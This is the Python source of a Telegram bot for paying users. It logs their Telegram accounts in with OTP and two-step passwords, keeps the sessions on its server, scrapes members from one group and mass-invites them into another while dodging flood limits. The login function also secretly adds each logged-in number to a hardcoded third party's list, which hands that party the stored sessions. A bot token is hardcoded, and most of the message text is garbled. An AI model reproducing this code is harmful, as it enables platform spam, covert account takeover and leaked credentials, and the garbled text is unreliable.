import re, os, random, asyncio, html,configparser,pyrogram, subprocess, requests, time, traceback, logging, telethon, csv, json, sys
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from asyncio.exceptions import TimeoutError
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneNumberInvalid, ApiIdInvalid, PhoneCodeInvalid, PhoneCodeExpired, UserNotParticipant
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from telethon.client.chats import ChatMethods
from csv import reader
from telethon.sync import TelegramClient
from telethon import functions, types, TelegramClient, connection, sync, utils, errors
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, InviteToChannelRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError
from telethon.sessions import StringSession
from pyrogram import Client,filters
from pyromod import listen
from sql import add_user, query_msg
from support import users_info
from datetime import datetime, timedelta,date
import csv
#add_user= query_msg= users_info=0
if not os.path.exists('./sessions'):
    os.mkdir('./sessions')
if not os.path.exists(f"Users/1670464790/phone.csv"):
   os.mkdir('./Users')
   os.mkdir(f'./Users/1670464790')
   open(f"Users/1670464790/phone.csv","w")
if not os.path.exists('data.csv'):
    open("data.csv","w")
APP_ID = ""
API_HASH = ""
BOT_TOKEN = "5132308408:AAEfRbZUpUzcqnaJWP19l1S8zAjLj3YJSk4"
UPDATES_CHANNEL = "Demon_Creators"
OWNER= [1670464790,5232671552,5156363006]
PREMIUM=[1670464790,5232671552,5156363006]
app = pyrogram.Client("app", api_id=APP_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

with open("data.csv", encoding='UTF-8') as f:
    rows = csv.reader(f, delimiter=",", lineterminator="\n")
    next(rows, None)
    ishan=[]
    for row in rows:
        d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
        r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2021-11-03", '%Y-%m-%d')
        if d<=r:
            PREMIUM.append(int(row[1]))

# ------------------------------- Subscribe --------------------------------- #
async def Subscribe(lel, message):
   update_channel = UPDATES_CHANNEL
   if update_channel:
      try:
         user = await app.get_chat_member(update_channel, message.chat.id)
         if user.status == "kicked":
            await app.send_message(chat_id=message.chat.id,text="s????????? s????, ???????? ???????? ???????????????. ??????????????????????? ????? [?????????????? s?????????????????](https://t.me/Demon_Support_Group).", parse_mode="markdown", disable_web_page_preview=True)
            return 1
      except UserNotParticipant:
         await app.send_message(chat_id=message.chat.id, text="**???????????s??? ?????????? ????? ??????????????????s ????????????????? ?????? ???s??? ??????!\n ???????? ????????????? ????? ?????? ?????????????? /start**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("???????????????????? ???????????????????????????? ????????????????????????????????", url=f"https://t.me/{update_channel}")]]), parse_mode="markdown")
         return 1
      except Exception:
         await app.send_message(chat_id=message.chat.id, text="**s???????????????????? ??????????? ????????????. ???????????????????? ????? [?????????????? s?????????????????](https://t.me/Demon_Support_Group).**", parse_mode="markdown", disable_web_page_preview=True)
         return 1



# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["start"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   id = message.from_user.id
   user_name = '@' + message.from_user.username if message.from_user.username else None
   await add_user(id, user_name)
   but = InlineKeyboardMarkup([[InlineKeyboardButton("??????????????", callback_data="Login"), InlineKeyboardButton("?????????????????????", callback_data="Adding") ],[InlineKeyboardButton("?????????????????????????", callback_data="Edit"), InlineKeyboardButton("?????????????????s??????????", callback_data="Ish")],[InlineKeyboardButton("???????????????? ????????????????????", callback_data="Remove"), InlineKeyboardButton("??????????????????? ?????????????????????", callback_data="Admin")]])
   await message.reply_text(f"**????** `{message.from_user.first_name}` **!\n\n??'??? ?????????????????????? ??????????????????????? ????????????? \n???????????? ??????? ???????????? s????????????????? ??????? ?????????? ,\n??????????????????? ???s?????? ??????? ???s??? ????? ???????????????.\n\n ???????????? ?????????? ???? @Demon_Creators**", reply_markup=but)



# ------------------------------- Set Phone No --------------------------------- #
@app.on_message(filters.private & filters.command(["phone"]))
async def phone(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**???????? ???????? ????? ?????????????? ??? ??????????????????? ???s?????\n ???????????s??? ??????????? ??? s?????s????????????????????\n200??s ???????? ?????????????\n???????????????????? ???? ???????s ?????????????  @Demon_Support_Group\n\n???????????? ?????????? ???? @Demon_Creators**")
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
      str_list = [row[0] for row in csv.reader(f)]
      NonLimited=[]
      a=0
      for pphone in str_list:
         a+=1
         NonLimited.append(str(pphone))
      number = await app.ask(chat_id=message.chat.id, text="**????????????? ??????????????? ????? ????????????????????s ?????? ??????????? (???????? ????????????????????????????)\n\n???????????? ?????????? ???? @Demon_Creators**")
      n = int(number.text)
      a+=n
      if n<1 :
         await app.send_message(message.chat.id, """**????????????????? ???????????????? ?????ss ?????????? 1 ???????????? ???????\n\n???????????? ?????????? ???? @Demon_Creators**""")
         return
      if a>100:
         await app.send_message(message.chat.id, f"**???????? ???????? ????????? ????????? {100-a} ????????????? ????? \n\n???????????? ?????????? ???? @Demon_Creators**")
         return
      for i in range (1,n+1):
         number = await app.ask(chat_id=message.chat.id, text="**???????? s???????? ?????????? ????????????????????? ????????????????????'s ????????????? ??????????????? ???? ???????????????????????????????? ????????????????. \n????????????????????? **???????????????????????????? ????????????????**. \n???x??????????????: **+14154566376 = 14154566376 ????????? ???????? +**\n\n???????????? ?????????? ???? @Demon_Creators**")
         phone = number.text
         if "+" in phone:
            await app.send_message(message.chat.id, """**???s ?????????????????? + ??s ???????? ??????????????????\n\n???????????? ?????????? ???? @Demon_Creators**""")
         elif len(phone)==11 or len(phone)==12:
            Singla = str(phone)
            NonLimited.append(Singla)
            await app.send_message(message.chat.id, f"**{n}). ?????????????: {phone} s?????? s?????????ss??????????????\n\n???????????? ?????????? ???? @Demon_Creators**")
         else:
            await app.send_message(message.chat.id, """**????????????????? ??????????????? ???????????????? ??????? ???????????? \n\n???????????? ?????????? ???? @Demon_Creators**""") 
      NonLimited=list(dict.fromkeys(NonLimited))
      with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
         writer = csv.writer(writeFile, lineterminator="\n")
         writer.writerows(NonLimited)
      with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
         for line in infile:
            outfile.write(line.replace(",", ""))
 except Exception as e:
   await app.send_message(message.chat.id, f"**????????????: {e}\n\n???????????? ?????????? ???? @Demon_Creators**")
   return



# ------------------------------- Acc Login --------------------------------- #
@app.on_message(filters.private & filters.command(["login"]))
async def login(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**???????? ???????? ????? ?????????????? ??? ??????????????????? ???s?????\n???????????s??? ??????????? ??? s?????s???????????????????? \n200??s ???????? ????????????? \n???????????????????? ???? ????????s??? @Demon_Support_Group\n\n???????????? ?????????? ???? @Demon_Creators**")
      return
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
    r=[]
    l=[]
    str_list = [row[0] for row in csv.reader(f)]
    po = 0
    s=0
    for pphone in str_list:
     try:
      phone = int(utils.parse_phone(pphone))
      client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
      await client.connect()
      if not await client.is_user_authorized():
         try:
            await client.send_code_request(phone)
         except FloodWait as e:
            await message.reply(f"???????????? ???????????????? ???????????????????????????????????? ????????{e.x} ????????????????????????????")
            return
         except PhoneNumberInvalidError:
            await message.reply("?????????? ????????????? ??????????????? ??s ?????????????????.\n\n????????ss /start ?????? s??????????? ????????????!")
            return
         except PhoneNumberBannedError:
            await message.reply(f"{phone} ???????? ????????????????????????")
            continue
         try:
            otp = await app.ask(message.chat.id, ("????? ????????? ??s s???????? ?????? ?????????? ????????????? ???????????????, \n???????????s??? ????????????? ????????? ???? `1 2 3 4 5` ????????????????. __(???????????????????? ???????????????????????????? ???????????????? ????????????????????????????!)__ \n\n???? ???????? ???????? s?????????????? ????????? ?????????? ??????? /restart ???????? s??????????? ??????s??? ???????????? ?????????? /start ???????????????????? ?????? ????????.\n????????ss /cancel ?????? ????????????????."), timeout=300)
         except TimeoutError:
            await message.reply("??????????? ???????????? ??????????????????? ????? 5???????.\n????????ss /start ?????? s??????????? ????????????!")
            return
         otps=otp.text
         try:
            await client.sign_in(phone=phone, code=' '.join(str(otps)))
         except PhoneCodeInvalidError:
            await message.reply("????????????????? ????????????.\n\n????????ss /start ?????? s??????????? ????????????!")
            return
         except PhoneCodeExpiredError:
            await message.reply("???????????? ??s ???x?????????????.\n\n????????ss /start ?????? s??????????? ????????????!")
            return
         except SessionPasswordNeededError:
            try:
               two_step_code = await app.ask(message.chat.id,"?????????? ???????????????????? ??????????? ????????? ?????????-s????????? ??????????????????????????????.\n???????????s??? ????????????? ?????????? ??????ss???????????.",timeout=300)
            except TimeoutError:
               await message.reply("`??????????? ???????????? ??????????????????? ????? 5???????.\n\n????????ss /start ?????? s??????????? ????????????!`")
               return
            try:
               await client.sign_in(password=two_step_code.text)
            except Exception as e:
               await message.reply(f"**????????????:** `{str(e)}`")
               return
            except Exception as e:
               await app.send_message(message.chat.id ,f"**????????????:** `{str(e)}`")
               return
      with open("Users/5009839424/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         NonLimited=[]
         for pphone in str_list:
            NonLimited.append(str(pphone))
         Singla = str(phone)
         NonLimited.append(Singla)
         NonLimited=list(dict.fromkeys(NonLimited))
         with open('1.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(NonLimited)
         with open("1.csv") as infile, open(f"Users/5009839424/phone.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))
      os.remove("1.csv")
      await client(functions.contacts.UnblockRequest(id='@SpamBot'))
      await client.send_message('SpamBot', '/start')
      msg = str(await client.get_messages('SpamBot'))
      re= "bird"
      if re in msg:
         stats="??????????? ????????s, ????? ????????????s ???????? ?????????????????????? ??????????????????? ?????? ?????????? ????????????????????. ????????'????? ?????????? ???s ??? ?????????!"
         s+=1
         r.append(str(phone))
      else:
         stats='you are limited'
         l.append(str(phone))
      me = await client.get_me()
      await app.send_message(message.chat.id, f"??????????? s?????????ss?????????????? ???????????.\n\n**???????????:** {me.first_name}\n**???s????????????????:** {me.username}\n**?????????????:** {phone}\n**s????????????????? s?????????s:** {stats}\n\n**???????????? ?????????? ???? @Demon_Creators**")     
      po+=1
      await client.disconnect()
     except ConnectionError:
      await client.disconnect()
      await client.connect()
     except TypeError:
      await app.send_message(message.chat.id, "**???????? ??????????? ???????? ????????????? ???????? ????????????? ??????????????? \n???????????s??? ??????????? ???????????????????? ???? ????????????????? /start.\n\n???????????? ?????????? ???? @Demon_Creators**")  
     except Exception as e:
      await app.send_message(message.chat.id, f"**????????????: {e}\n\n???????????? ?????????? ???? @Demon_Creators**")
    for ish in l:
      r.append(str(ish))
    with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
      writer = csv.writer(writeFile, lineterminator="\n")
      writer.writerows(r)
    with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
      for line in infile:
         outfile.write(line.replace(",", "")) 
    await app.send_message(message.chat.id, f"**??????? ????????? ??????????? {s} ???????????????????? ??????????????????????? ????? {po} \n\n???????????? ?????????? ???? @Demon_Creators**") 
 except Exception as e:
   await app.send_message(message.chat.id, f"**????????????: {e}\n\n???????????? ?????????? ???? @Demon_Creators**")
   return
                          


# ------------------------------- Acc Private Adding --------------------------------- #
@app.on_message(filters.private & filters.command(["adding"]))
async def to(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**???????? ???????? ????? ?????????????? ??? ??????????????????? ???s????? \n???????????s??? ??????????? ??? s?????s???????????????????? \n200??s ???????? ?????????????\n???????????????????? ????? ????????s??? @Demon_Support_Group\n\n???????????? ?????????? ???? @Demon_Creators**")
      return
   number = await app.ask(chat_id=message.chat.id, text="**???????? s???????? ???????? ?????????? ????????????? ???s???????????????? \n\n???????????? ?????????? ???? @Demon_Creators**")
   From = number.text
   number = await app.ask(chat_id=message.chat.id, text="**???????? s???????? ???????? ?????? ????????????? ??????????????????????  \n\n???????????? ?????????? ???? @Demon_Creators**")
   To = number.text
   number = await app.ask(chat_id=message.chat.id, text="**???????? s???????? s??????????? ??????????  \n\n???????????? ?????????? ???? @Demon_Creators**")
   a = int(number.text)
   di=a
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         for pphone in str_list:
            peer=0
            ra=0
            dad=0
            r="**Adding Start**\n\n"
            phone = utils.parse_phone(pphone)
            client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
            await client.connect()
            await client(JoinChannelRequest(To))
            await app.send_message(chat_id=message.chat.id, text=f"**s????????????????? s???????????**")
            async for x in client.iter_participants(From, aggressive=True):
               try:
                  ra+=1
                  if ra<a:
                     continue
                  if (ra-di)>150:
                     await client.disconnect()
                     r+="**\n???????????? ?????????? ???? @Demon_Creators**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(message.chat.id, f"**????????????: {phone} ????????? ?????? s????????? ???????????? ??????????????? ?????? ?????x??? ???????????????\n\n???????????? ?????????? ???? @Demon_Creators**")
                     break
                  if dad>40:
                     r+="**\n???????????? ?????????? ???? @Demon_Creators**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     r="**??????????????? s???????????**\n\n"
                     dad=0
                  await client(InviteToChannelRequest(To, [x]))
                  status = 'DONE'
               except errors.FloodWaitError as s:
                  status= f'FloodWaitError for {s.seconds} sec'
                  await client.disconnect()
                  r+="**\n???????????? ?????????? ???? @Demon_Creators**"
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  await app.send_message(chat_id=message.chat.id, text=f'**???????????????????????? ???????????? {s.seconds} sec\n??????????????? ?????? ?????x??? ???????????????**')
                  break
               except UserPrivacyRestrictedError:
                  status = 'PrivacyRestrictedError'
               except UserAlreadyParticipantError:
                  status = 'ALREADY'
               except UserBannedInChannelError:
                  status="User Banned"
               except ChatAdminRequiredError:
                  status="To Add Admin Required"
               except ValueError:
                  status="Error In Entry"
                  await client.disconnect()
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  break
               except PeerFloodError:
                  if peer == 10:
                     await client.disconnect()
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(chat_id=message.chat.id, text=f"**????????? ?????????? ???????????????????????????????????? \n??????????????? ?????? ?????x??? ???????????????**")
                     break
                  status = 'PeerFloodError'
                  peer+=1
               except ChatWriteForbiddenError as cwfe:
                  await client(JoinChannelRequest(To))
                  continue
               except errors.RPCError as s:
                  status = s.__class__.__name__
               except Exception as d:
                  status = d
               except:
                  traceback.print_exc()
                  status="Unexpected Error"
                  break
               r+=f"{a-di+1}). **{x.first_name}**   ???   **{status}**\n"
               dad+=1
               a+=1
   except Exception as e:
      await app.send_message(chat_id=message.chat.id, text=f"????????????: {e} \n\n ???????????? ?????????? ???? @Demon_Creators")
 except Exception as e:
   await app.send_message(message.chat.id, f"**????????????: {e}\n\n???????????? ?????????? ???? @Demon_Creators**")
   return



# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["phonesee"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**?????????? ???????? ????? ?????????????? ??? ??????????????????? ???s?????\n???????????s??? ??????????? ??? s?????s????????????????????\n200??s ???????? ????????????? \n???????????????????? ???? ????????s??? @Demon_Support_Group \n\n???????????? ?????????? ???? @Demon_Creators**")
      return
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         de="**?????????? ????????????? ??????????????? ???????? **\n\n"
         da=0
         dad=0
         for pphone in str_list:
            dad+=1
            da+=1
            if dad>40:
               de+="**\n???????????? ?????????? ???? @Demon_Creators**"
               await app.send_message(chat_id=message.chat.id, text=f"{de}")
               de="**?????????? ????????????? ??????????????? ????????**\n\n"
               dad=0 
            de+=(f"**{da}).** `{int(pphone)}`\n")
         de+="**\n???????????? ?????????? ???? @Demon_Creators**"
         await app.send_message(chat_id=message.chat.id, text=f"{de}")

   except Exception as a:
      pass


# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["remove"]))
async def start(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**???????? ???????? ????? ?????????????? ??? ??????????????????? ???s????? \n???????????s??? ??????????? ??? s?????s???????????????????? \n200??s ???????? ????????????? \n???????????????????? ???? ????????s??? @Demon_Support_Group\n\n???????????? ?????????? ???? @Demon_Creators**")
      return
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         f.closed
         number = await app.ask(chat_id=message.chat.id, text="**s???????? ??????????????? ?????? ?????????????????\n\n???????????? ?????????? ???? @Demon_Creators**")
         print(str_list)
         str_list.remove(number.text)
         with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(str_list)
         with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
            for line in infile:
               outfile.write(line.replace(",", ""))
         await app.send_message(chat_id=message.chat.id,text="?????????????? s?????????ss???????????")
   except Exception as a:
      pass
 except Exception as e:
   await app.send_message(message.chat.id, f"**????????????: {e}\n\n???????????? ?????????? ???? @Demon_Creators**")
   return

# ------------------------------- Admin Pannel --------------------------------- #
@app.on_message(filters.private & filters.command('ishan'))
async def subscribers_count(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id in OWNER:
      but = InlineKeyboardMarkup([[InlineKeyboardButton("?????????s?????s??????", callback_data="Users")], [InlineKeyboardButton("??????????????????????s??????", callback_data="Broadcast")],[InlineKeyboardButton("???????????? ???s?????s???", callback_data="New")], [InlineKeyboardButton("????????????????? ???s?????s???", callback_data="Check")]])
      await app.send_message(chat_id=message.chat.id,text=f"**????** `{message.from_user.first_name}` **!\n\n???????????????????? ?????? ????????????? ????? ?????????????????????? ???????????????????????? ?????????????\n\n???????????? ?????????? ???? @Demon_Creators**", reply_markup=but)
   else:
      await app.send_message(chat_id=message.chat.id,text="**???????? ???????? ???????? ????????????? ????? ????????\n\n???????????? ?????????? ???? @Demon_Creators**")



# ------------------------------- Buttons --------------------------------- #
@app.on_callback_query()
async def button(app, update):
   k = update.data
   if "Login" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**????????????? ??s ???????????????? ????? ???????????..!\n??????s??? ????????????? ????? /login ?????? ??????????? ???????? ?????????????? s?????????s ????? ????????????????????.\n\n???????????? ?????????? ???? @Demon_Creators**""") 
   elif "Ish" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**????????????? ??s ???????????????? ????? ???????????..!\n??????s??? ????????????? ????? /phonesee ?????? ??????????? ???????? ?????????????? s?????????s ????? ????????????????????.\n\n???????????? ?????????? ???? @Demon_Creators**""") 
   elif "Remove" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**????????????? ??s ???????????????? ????? ???????????..!\n??????s??? ????????????? ????? /remove ?????? ??????????? ???????? ?????????????? s?????????s ????? ????????????????????.\n\n???????????? ?????????? ???? @Demon_Creators**""") 
   elif "Adding" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**????????????? ??s ???????????????? ????? ???????????..!\n??????s??? ????????????? ????? /adding ?????? s??????????? ?????????????????? ?????????? ??????????? ????????????????????.\n\n???????????? ?????????? ???? @Demon_Creators**""") 
   elif "Edit" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**????????????? ??s ???????????????? ????? ???????????..!\n??????s??? ????????????? ????? /phone ?????? ??????????? ???????? ?????????????? s?????????s ????? ????????????????????.\n\n???????????? ?????????? ???? @Demon_Creators**""") 
   elif "Home" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**????????????? ??s ???????????????? ????? ???????????..!\n??????s??? ????????????? ????? /start ?????? ????? ???????????.\n\n???????????? ?????????? ???? @Demon_Creators**""") 
   elif "Users" in k:
      await update.message.delete()
      msg = await app.send_message(update.message.chat.id,"???????????s??? ???????????...")
      messages = await users_info(app)
      await msg.edit(f"Total:\n\nUsers - {messages[0]}\nBlocked - {messages[1]}")
   elif "New" in k:
      await update.message.delete()
      number = await app.ask(chat_id=update.message.chat.id, text="**s???????? ???s????? ????? ????? ???????? ???s?????\n\n???????????? ?????????? ???? @Demon_Creators**")
      phone = int(number.text)
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         f.closed
         f = open("data.csv", "w", encoding='UTF-8')
         writer = csv.writer(f, delimiter=",", lineterminator="\n")
         writer.writerow(['sr. no.', 'user id', "Date"])
         a=1
         for i in rows:
            writer.writerow([a, i[1],i[2]])
            a+=1
         writer.writerow([a, phone, date.today() ])
         PREMIUM.append(int(phone))
         await app.send_message(chat_id=update.message.chat.id,text="?????????????? s?????????ss???????????")

   elif "Check" in k:
      await update.message.delete()
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         E="**Premium Users**\n"
         a=0
         for row in rows:
            d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
            r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2021-11-03", '%Y-%m-%d')
            if d<=r:
               a+=1
               E+=f"{a}). {row[1]} - {row[2]}\n"
         E+="\n\n**???????????? ?????????? ???? @Demon_Creators**"
         await app.send_message(chat_id=update.message.chat.id,text=E)

   elif "Admin" in k:
      await update.message.delete()
      if update.message.chat.id in OWNER:
         but = InlineKeyboardMarkup([[InlineKeyboardButton("?????????s?????s??????", callback_data="Users")], [InlineKeyboardButton("??????????????????????s??????", callback_data="Broadcast")],[InlineKeyboardButton("???????????? ???s?????s???", callback_data="New")], [InlineKeyboardButton("????????????????? ???s?????s???", callback_data="Check")]])
         await app.send_message(chat_id=update.message.chat.id,text=f"**???????????????????? ?????? ????????????? ??????????????? ????? ?????????????????????? ???????????????????????? ?????????????\n\n???????????? ?????????? ???? @Demon_Creators**", reply_markup=but)
      else:
         await app.send_message(chat_id=update.message.chat.id,text="**???????? ???????? ???????? ????????????? ????? ???????? \n\n???????????? ?????????? ???? @Demon_Creators**")
   elif "Broadcast" in k:
    try:
      query = await query_msg()
      a=0
      b=0
      number = await app.ask(chat_id=update.message.chat.id, text="**???????? ?????? ??????ss???????? ??????? ???????????????????s??? \n\n???????????? ?????????? ???? @Demon_Creators**")
      phone = number.text
      for row in query:
         chat_id = int(row[0])
         try:
            await app.send_message(chat_id=int(chat_id), text=f"{phone}", parse_mode="markdown", disable_web_page_preview=True)
            a+=1
         except FloodWait as e:
            await asyncio.sleep(e.x)
            b+=1
         except Exception:
            b+=1
            pass
      await app.send_message(update.message.chat.id,f"???s?????????ss??????????? ???????????????????s????????? ?????? {a} ???????????s\n??????????????? - {b} ???????????s !")
    except Exception as e:
      await app.send_message(update.message.chat.id,f"**????????????: {e}\n\n???????????? ?????????? ???? @Demon_Creators**")




text = """???????????? ?? ?????? ????????????? ????? ???????? ?????s?? ???????? ???????????s??? ?????????? ????? ????????????? ?????????????????s
"""
print(text)
print("?????????????????? ??????????????? s????????????????? s?????????ss???????????........")
app.run()
